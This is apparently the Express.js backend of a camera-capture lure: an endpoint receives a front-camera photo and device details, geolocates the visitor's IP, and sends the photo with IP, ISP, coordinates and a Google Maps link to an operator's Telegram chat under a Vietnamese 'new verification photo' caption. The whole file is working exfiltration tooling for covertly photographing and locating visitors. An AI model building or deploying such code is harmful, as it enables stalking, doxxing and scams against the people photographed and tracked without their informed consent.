const express = require("express");
const multer = require("multer");
const path = require("path");

const app = express();
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 15 * 1024 * 1024 },
});

app.use(express.json({ limit: "2mb" }));
app.use(express.static(__dirname, { extensions: ["html"] }));

app.get("/healthz", (_, res) => res.status(200).send("ok"));

app.get("/api/health", (_, res) => {
  res.json({
    hasToken: !!process.env.TELEGRAM_BOT_TOKEN,
    hasChatId: !!process.env.TELEGRAM_CHAT_ID,
    node: process.version,
  });
});

app.post("/api/tele-proxy", upload.single("front"), async (req, res) => {
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TOKEN || !CHAT_ID) {
    return res.status(500).json({
      success: false,
      error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
    });
  }

  try {
    const userIP =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "Unknown";

    let geo = {};
    try {
      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`, {
        signal: AbortSignal.timeout(4000),
      });
      if (geoRes.ok) geo = await geoRes.json();
    } catch (_) {}

    const lat = geo.latitude ?? "0";
    const lon = geo.longitude ?? "0";
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    let clientData = {};
    try {
      clientData = JSON.parse(req.body.clientInfo || "{}");
    } catch (_) {}

    if (!req.file || !req.file.buffer || req.file.size === 0) {
      return res.status(400).json({
        success: false,
        error: "No photo file received",
      });
    }

    const caption = `
📡 [ẢNH XÁC THỰC MỚI]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP: ${userIP}
🏢 ISP: ${geo.asName || "Unknown"}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${geo.countryName || "Unknown"}
📍 Vĩ độ: ${lat}
📍 Kinh độ: ${lon}
📌 Maps: https://www.google.com/maps?q=${lat},${lon}
📸 Camera: ${clientData.camera || "✅ Đã chụp"}
`.trim();

    const teleForm = new FormData();
    teleForm.append("chat_id", CHAT_ID);
    teleForm.append("caption", caption);
    teleForm.append(
      "photo",
      new Blob([req.file.buffer], { type: req.file.mimetype || "image/jpeg" }),
      "front.jpg",
    );

    const teleRes = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
      {
        method: "POST",
        body: teleForm,
        signal: AbortSignal.timeout(20000),
      },
    );

    const teleData = await teleRes.json().catch(() => ({}));

    if (!teleData.ok) {
      return res.status(500).json({
        success: false,
        error: teleData.description || "Telegram error",
      });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
});

app.get("*", (req, res, next) => {
  if (req.path.startsWith("/api/")) return next();
  res.sendFile(path.join(__dirname, "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server on port ${PORT}`);
  console.log(`Token loaded: ${!!process.env.TELEGRAM_BOT_TOKEN}`);
  console.log(`ChatID loaded: ${!!process.env.TELEGRAM_CHAT_ID}`);
});
